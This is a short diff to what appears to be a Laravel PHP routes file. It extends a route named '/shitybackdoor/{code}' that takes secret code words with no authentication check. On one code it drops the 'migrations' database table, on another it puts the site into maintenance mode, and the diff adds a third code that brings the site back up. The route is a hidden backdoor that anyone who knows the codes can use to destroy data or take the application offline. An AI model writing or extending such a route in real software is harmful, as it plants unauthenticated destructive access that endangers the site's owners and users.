@@ -65,5 +65,7 @@ Route::get('/shitybackdoor/{code}', function ($code) {
         Schema::drop('migrations');
     } elseif ($code === 'spudimunshutdown') {
         Artisan::call('down');
+    } elseif ($code === 'spudimunshutup') {
+        Artisan::call('up');
     }
 });
